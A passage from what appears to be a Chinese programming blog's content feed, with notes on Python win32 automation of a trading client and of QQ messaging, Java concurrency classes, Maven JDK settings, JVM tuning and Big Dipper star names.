<span class="number">1047</span>)</span><br><span class="line">        F_Chexinsub = win32gui.GetDlgItem(F_Chexin, <span class="number">200</span>)</span><br><span class="line">        self.G_entrust = win32gui.GetDlgItem(F_Chexinsub, <span class="number">1047</span>)  <span class="comment"># 委托列表</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">buy</span>(<span class="params">self, symbol, price, vol</span>):</span><br><span class="line">        win32gui.SendMessage(self.E_Bsymbol, win32con.WM_SETTEXT, <span class="literal">None</span>, symbol) <span class="comment"># 输入买入代码</span></span><br><span class="line">        win32gui.SendMessage(self.E_Bprice, win32con.WM_SETTEXT, <span class="literal">None</span>, price)  <span class="comment"># 输入买入价格</span></span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        win32gui.SendMessage(self.E_Bvol, win32con.WM_SETTEXT, <span class="literal">None</span>, vol)  <span class="comment"># 输入买入数量</span></span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        win32gui.SendMessage(self.B_Buy, win32con.BM_CLICK, <span class="literal">None</span>, <span class="literal">None</span>) <span class="comment"># 买入确定</span></span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sell</span>(<span class="params">self, symbol, price, vol</span>):</span><br><span class="line">        win32gui.SendMessage(self.E_Ssymbol, win32con.WM_SETTEXT, <span class="literal">None</span>, symbol) <span class="comment"># 输入卖出代码</span></span><br><span class="line">        win32gui.SendMessage(self.E_Sprice, win32con.WM_SETTEXT, <span class="literal">None</span>, price)  <span class="comment"># 输入卖出价格</span></span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        win32gui.SendMessage(self.E_Svol, win32con.WM_SETTEXT, <span class="literal">None</span>, vol)  <span class="comment"># 输入卖出数量</span></span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        win32gui.SendMessage(self.B_Sell, win32con.BM_CLICK, <span class="literal">None</span>, <span class="literal">None</span>) <span class="comment"># 卖出确定</span></span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">cancle</span>(<span class="params">self, symbol, direction</span>):</span><br><span class="line">        win32gui.SendMessage(self.B_refresh, win32con.BM_CLICK, <span class="literal">None</span>, <span class="literal">None</span>)  <span class="comment"># 刷新持仓</span></span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        win32gui.SendMessage(self.E_Csymbol, win32con.WM_SETTEXT, <span class="literal">None</span>, symbol)  <span class="comment"># 输入撤单</span></span><br><span class="line">        win32gui.SendMessage(self.B_Csort, win32con.BM_CLICK, <span class="literal">None</span>, <span class="literal">None</span>)  <span class="comment"># 查询代码</span></span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">if</span> direction == <span class="number">0</span>:</span><br><span class="line">            win32gui.SendMessage(self.B_Cbuy, win32con.BM_CLICK, <span class="literal">None</span>, <span class="literal">None</span>)  <span class="comment"># 撤买</span></span><br><span class="line">        <span class="keyword">elif</span> direction == <span class="number">1</span>:</span><br><span class="line">            win32gui.SendMessage(self.B_Csell, win32con.BM_CLICK, <span class="literal">None</span>, <span class="literal">None</span>)  <span class="comment"># 撤卖</span></span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">position</span>(<span class="params">self</span>):</span><br><span class="line">        win32gui.SendMessage(self.B_refresh, win32con.BM_CLICK, <span class="literal">None</span>, <span class="literal">None</span>)  <span class="comment"># 刷新持仓</span></span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        win32gui.SetForegroundWindow(self.G_position)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        position = []</span><br><span class="line">        data = get_clipboard()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">int</span>((<span class="built_in">len</span>(data)-<span class="number">14</span>)/<span class="number">14</span>)+<span class="number">1</span>):</span><br><span class="line">            item = data[<span class="number">14</span>*i:<span class="number">14</span>*(i+<span class="number">1</span>)]</span><br><span class="line">            position.append(item)</span><br><span class="line">        df = pd.DataFrame(position, columns=data[:<span class="number">14</span>])</span><br><span class="line">        <span class="keyword">return</span> df</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">entrusts</span>(<span class="params">self</span>):</span><br><span class="line">        win32gui.SendMessage(self.B_refresh, win32con.BM_CLICK, <span class="literal">None</span>, <span class="literal">None</span>)  <span class="comment"># 刷新持仓</span></span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        win32gui.SetForegroundWindow(self.G_entrust)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        entrust=[]</span><br><span class="line">        data = get_clipboard()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">int</span>((<span class="built_in">len</span>(data)-<span class="number">13</span>)/<span class="number">13</span>)+<span class="number">1</span>):</span><br><span class="line">            item = data[<span class="number">13</span>*i:<span class="number">13</span>*(i+<span class="number">1</span>)]</span><br><span class="line">            entrust.append(item)</span><br><span class="line">        df = pd.DataFrame(entrust, columns=data[:<span class="number">13</span>])</span><br><span class="line">        <span class="keyword">return</span> df</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------Test-------------------------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    trader = HT()</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    trader.buy(<span class="string">&#x27;000002&#x27;</span>, <span class="string">&#x27;24.76&#x27;</span>, <span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">    trader.cancle(<span class="string">&#x27;000002&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="comment">#df = trader.position()</span></span><br><span class="line">    <span class="comment">#print(trader.entrusts())</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BlockingQueue</title>
      <link href="/2017/05/10/BlockingQueue/"/>
      <url>/2017/05/10/BlockingQueue/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="http://www.cnblogs.com/szlbm/p/5588518.html">Queue、BlockingQueue 以及利用 BlockingQueue 实现生产者&#x2F;消费者模型</a></li><li><a href="http://blog.csdn.net/longeremmy/article/details/8225989">集合框架 Queue—BlockingQueue 详解</a></li></ul><p>BlockingQueue，如果 BlockingQueue 是空的，从 BlockingQueue 取东西的操作将会被阻断进入等待状态，直到 BlockingQueue 进了东西才会被唤醒，同样，如果 BlockingQueue 是满的，任何试图往里存东西的操作也会被阻断进入等待状态，直到 BlockingQueue 里有空间时才会被唤醒继续操作。Queue 不是线程安全的。因此可以将 Blockingqueue 用于用于生产者-使用者队列。</p><span id="more"></span><h4 id="BlockingQueue-定义的常用方法如下："><a href="#BlockingQueue-定义的常用方法如下：" class="headerlink" title="BlockingQueue 定义的常用方法如下："></a>BlockingQueue 定义的常用方法如下：</h4><ul><li><font color='red'><strong>add(object)</strong></font>：把 object 加到 BlockingQueue 里，如果 BlockingQueue 可以容纳，则返回 true，否则抛出异常。</li><li><font color='red'><strong>offer(object)</strong></font>：表示如果可能的话，将 object 加到 BlockingQueue 里，即如果 BlockingQueue 可以容纳，则返回 true，否则返回 false。</li><li><font color='red'><strong>put(object)</strong></font>：把 object 加到 BlockingQueue 里，如果 BlockingQueue 没有空间，则调用此方法的线程被阻断直到 BlockingQueue 里有空间再继续。</li><li><font color='red'><strong>poll(time)</strong></font>：取走 BlockingQueue 里排在首位的对象，若不能立即取出，则可以等 time 参数规定的时间，取不到时返回 null。</li><li><font color='red'><strong>take()</strong></font>：取走 BlockingQueue 里排在首位的对象，若 BlockingQueue 为空，阻断进入等待状态直到 BlockingQueue 有新的对象被加入为止。</li></ul><h4 id="BlockingQueue-有四个具体的实现类，根据不同需求，选择不同的实现类："><a href="#BlockingQueue-有四个具体的实现类，根据不同需求，选择不同的实现类：" class="headerlink" title="BlockingQueue 有四个具体的实现类，根据不同需求，选择不同的实现类："></a>BlockingQueue 有四个具体的实现类，根据不同需求，选择不同的实现类：</h4><ul><li><font color='red'><strong>ArrayBlockingQueue</strong></font>：规定大小的 BlockingQueue，其构造函数必须带一个 int 参数来指明其大小。其所含的对象是以 FIFO（先入先出）顺序排序</li><li><font color='red'><strong>LinkedBlockingQueue</strong></font>：大小不定的 BlockingQueue，若其构造函数带一个规定大小的参数，生成的 BlockingQueue 有大小限制，若不带大小参数，所生成的 BlockingQueue 的大小由 Integer.MAX_VALUE 来决定。其所含的对象是以 FIFO 顺序排序的。</li><li><font color='red'><strong>PriorityBlockingQueue</strong></font>：类似于**<code>LinkedBlockingQueue</code>**,但其所含对象的排序不是 FIFO，而是依据对象的自然排序顺序或者是构造函数所带的 Comparator 决定的顺序。</li><li><font color='red'><strong>SynchronousQueue</strong></font>：特殊的 BlockingQueue，对其的操作必须是放和取交替完成的。<br>LinkedBlockingQueue 和 ArrayBlockingQueue 比较起来，它们背后所用的数据结构不一样，导致 LinkedBlockingQueue 的数据吞吐量要大于 ArrayBlockingQueue，但在线程数量很大时其性能的可预见性低于 ArrayBlockingQueue。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 并发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Maven项目默认JDK版本</title>
      <link href="/2017/05/09/Maven%E9%A1%B9%E7%9B%AE%E9%BB%98%E8%AE%A4JDK%E7%89%88%E6%9C%AC/"/>
      <url>/2017/05/09/Maven%E9%A1%B9%E7%9B%AE%E9%BB%98%E8%AE%A4JDK%E7%89%88%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<ul><li>pom.xml 仅作用于当前项目</li><li>settings.xml 配置是全局的项目</li></ul><span id="more"></span><h3 id="settings-xml-配置"><a href="#settings-xml-配置" class="headerlink" title="settings.xml 配置"></a>settings.xml 配置</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">profiles</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>development<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">activation</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">jdk</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">jdk</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">activeByDefault</span>&gt;</span>true<span class="tag">&lt;/<span class="name">activeByDefault</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">activation</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">maven.compiler.compilerVersion</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.compilerVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">profiles</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="pom-xml-配置"><a href="#pom-xml-配置" class="headerlink" title="pom.xml 配置"></a>pom.xml 配置</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python发送QQ消息</title>
      <link href="/2017/05/08/python%E5%8F%91%E9%80%81QQ%E6%B6%88%E6%81%AF/"/>
      <url>/2017/05/08/python%E5%8F%91%E9%80%81QQ%E6%B6%88%E6%81%AF/</url>
      
        <content type="html"><![CDATA[<p>利用Python win32来操作窗口句柄触发QQ消息发送。同理可以用其他语言实现。参考下面源码。如果窗口获取存在问题，通过 <code>spy.exe</code> 工具来重新获取句柄。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> win32gui</span><br><span class="line"><span class="keyword">import</span> win32con</span><br><span class="line"><span class="keyword">import</span> win32clipboard <span class="keyword">as</span> w</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getText</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;获取剪贴板文本&quot;&quot;&quot;</span></span><br><span class="line">    w.OpenClipboard()</span><br><span class="line">    d = w.GetClipboardData(win32con.CF_UNICODETEXT)</span><br><span class="line">    w.CloseClipboard()</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setText</span>(<span class="params">aString</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;设置剪贴板文本&quot;&quot;&quot;</span></span><br><span class="line">    w.OpenClipboard()</span><br><span class="line">    w.EmptyClipboard()</span><br><span class="line">    w.SetClipboardData(win32con.CF_UNICODETEXT, aString)</span><br><span class="line">    w.CloseClipboard()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_qq</span>(<span class="params">to_who, msg</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;发送qq消息</span></span><br><span class="line"><span class="string">    to_who：qq消息接收人</span></span><br><span class="line"><span class="string">    msg：需要发送的消息</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 将消息写到剪贴板</span></span><br><span class="line">    setText(msg)</span><br><span class="line">    <span class="comment"># 获取qq窗口句柄</span></span><br><span class="line">    qq = win32gui.FindWindow(<span class="literal">None</span>, to_who)</span><br><span class="line">    <span class="comment"># 投递剪贴板消息到QQ窗体</span></span><br><span class="line">    win32gui.SendMessage(qq, <span class="number">258</span>, <span class="number">22</span>, <span class="number">2080193</span>)</span><br><span class="line">    win32gui.SendMessage(qq, <span class="number">770</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="comment"># 模拟按下回车键</span></span><br><span class="line">    win32gui.SendMessage(qq, win32con.WM_KEYDOWN, win32con.VK_RETURN, <span class="number">0</span>)</span><br><span class="line">    win32gui.SendMessage(qq, win32con.WM_KEYUP, win32con.VK_RETURN, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line">to_who=<span class="string">&#x27;xxx&#x27;</span></span><br><span class="line">msg=<span class="string">&#x27;这是测试消息&#x27;</span></span><br><span class="line">send_qq(to_who, msg)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bloom Filter</title>
      <link href="/2017/05/07/Bloom%20Filter/"/>
      <url>/2017/05/07/Bloom%20Filter/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="http://blog.csdn.net/jiaomeng/article/details/1496329">从哈希存储到 Bloom Filter</a></li><li><a href="http://blog.csdn.net/jiaomeng/article/details/1495500">Bloom Filter 概念和原理</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Big Data </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JVM 思维导图</title>
      <link href="/2017/05/05/JVM%20%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"/>
      <url>/2017/05/05/JVM%20%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<p><img src="/assets/images/JVM.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JVM GC调优例子</title>
      <link href="/2017/05/05/JVM%20GC%E8%B0%83%E4%BC%98%E4%BE%8B%E5%AD%90/"/>
      <url>/2017/05/05/JVM%20GC%E8%B0%83%E4%BC%98%E4%BE%8B%E5%AD%90/</url>
      
        <content type="html"><![CDATA[<p>新生代（Young generation）的空间太小，导致有一些本应该可以很快就被回收的对象被放到了老生代（Old generation）里，导致老生代上涨很快，频繁 Full GC。</p><ul><li><a href="http://blog.csdn.net/hengyunabc/article/details/24924843">JVM GC 调优一则–增大 Eden Space 提高性能</a></li><li><a href="http://www.importnew.com/24393.html#comment-555494">一次线上 OOM 排查经过</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CyclicBarrier</title>
      <link href="/2017/05/05/CyclicBarrier/"/>
      <url>/2017/05/05/CyclicBarrier/</url>
      
        <content type="html"><![CDATA[<p>CyclicBarrier 和 CountDownLatch 的功能类似，不过 CyclicBarrier 是相反的。</p><ul><li>CyclicBarrier 当线程数达到了这个数目时，所有进入等待状态的线程被唤醒并继续。</li><li>CountDownLatch 允许一个线程或者多个线程一直等待，直到其他线程完成以后再执行接下来的逻辑。</li></ul><p><strong>Example :</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.CyclicBarrier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CyclicBarrierTest</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">THREAD_NUM</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">WorkerThread</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">        CyclicBarrier barrier;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">WorkerThread</span><span class="params">(CyclicBarrier b)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.barrier = b;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Worker&#x27;s waiting&quot;</span>);</span><br><span class="line">                barrier.await();<span class="comment">//线程在这里等待，直到所有线程都到达barrier。</span></span><br><span class="line">                System.out.println(<span class="string">&quot;ID:&quot;</span> + Thread.currentThread().getId() + <span class="string">&quot; Working&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">CyclicBarrier</span> <span class="variable">cb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CyclicBarrier</span>(THREAD_NUM, <span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="comment">//当所有线程到达barrier时执行</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Inside Barrier&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; THREAD_NUM; i++) &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">WorkerThread</span>(cb)).start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">以下是输出：</span></span><br><span class="line"><span class="comment">Worker&#x27;s waiting</span></span><br><span class="line"><span class="comment">Worker&#x27;s waiting</span></span><br><span class="line"><span class="comment">Worker&#x27;s waiting</span></span><br><span class="line"><span class="comment">Worker&#x27;s waiting</span></span><br><span class="line"><span class="comment">Worker&#x27;s waiting</span></span><br><span class="line"><span class="comment">Inside Barrier</span></span><br><span class="line"><span class="comment">ID:12 Working</span></span><br><span class="line"><span class="comment">ID:8 Working</span></span><br><span class="line"><span class="comment">ID:11 Working</span></span><br><span class="line"><span class="comment">ID:9 Working</span></span><br><span class="line"><span class="comment">ID:10 Working</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 并发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>北斗七星英文名</title>
      <link href="/2017/05/05/%E5%8C%97%E6%96%97%E4%B8%83%E6%98%9F%E8%8B%B1%E6%96%87%E5%90%8D/"/>
      <url>/2017/05/05/%E5%8C%97%E6%96%97%E4%B8%83%E6%98%9F%E8%8B%B1%E6%96%87%E5%90%8D/</url>
      
        <content type="html"><![CDATA[<p>北斗七星的英文名。</p><p>《晋书·天文志》说北斗七星在太微北，枢为天，璇为地，玑为人，权为时，衡为音，开阳为律，摇光为星。</p><ul><li>天枢 Dubhe</li><li>天璇 Merak</li><li>天玑 Phecda</li><li>天权 Megrez</li><li>玉衡 Alioth</li><li>开阳 Mixar</li><li>摇光 Alkaid</li></ul>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 天文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CountDownLatch</title>
      <link href="/2017/05/05/CountDownLatch/"/>
      <url>/2017/05/05/CountDownLatch/</url>
      
        <content type="html"><![CDATA[<p>CountDownLatch 是一个同步工具类，允许一个线程或者多个线程一直等待，直到其他线程完成以后再执行接下来的逻辑。</p><p>一个场景就是，应用程序的主线程希望在负责启动框架服务的线程已经启动所有的框架服务之后再执行。</p><p>实现的方式是一个计数器。每次完成一个就相应的减少一，直到最后计数器归零，等待线程就继续执行接下来任务。</p><p><img src="/assets/images/CountDownLatch.png"></p><p>可以用在下面三种场景：</p><ul><li>实现最大的并行性</li><li>等待多个线程执行完成后再执行任务</li><li>死锁检测</li></ul><p><a href="http://www.importnew.com/15731.html">CountDownLatch 的介绍，含一个健康检查的例子</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 并发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringMVC工作原理</title>
      <link href="/2017/05/05/SpringMVC%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/"/>
      <url>/2017/05/05/SpringMVC%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p><img src="/assets/images/springmvc_01.png"></p><p><a href="http://blog.csdn.net/lu1005287365/article/details/52287952">http://blog.csdn.net/lu1005287365/article/details/52287952</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SpringMVC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache和Nginx对比</title>
      <link href="/2017/05/05/apache%E5%92%8CNginx%E5%AF%B9%E6%AF%94/"/>
      <url>/2017/05/05/apache%E5%92%8CNginx%E5%AF%B9%E6%AF%94/</url>
      
        <content type="html"><![CDATA[<p>面试的时候，问了一个很久以前考虑的问题，那时候还是第一次接触到Nginx。问题是，Apache、Nginx和Tomcat有什么区别？然后就是为什么Nginx这么优秀，那Apache还有什么存在的地位呢？</p><p>这个问题得从几个方面来看。</p><p>效率、稳定性、配置、模块、性能、线程模型、rewrite</p><p>Apache每次请求都要读取.htccess文件，而且每个文件夹都遍历一下看有没有.htaccess</p><p>&#x2F;&#x2F;TODO 未完待续</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nginx </tag>
            
            <tag> Apache </tag>
            
        </tags>
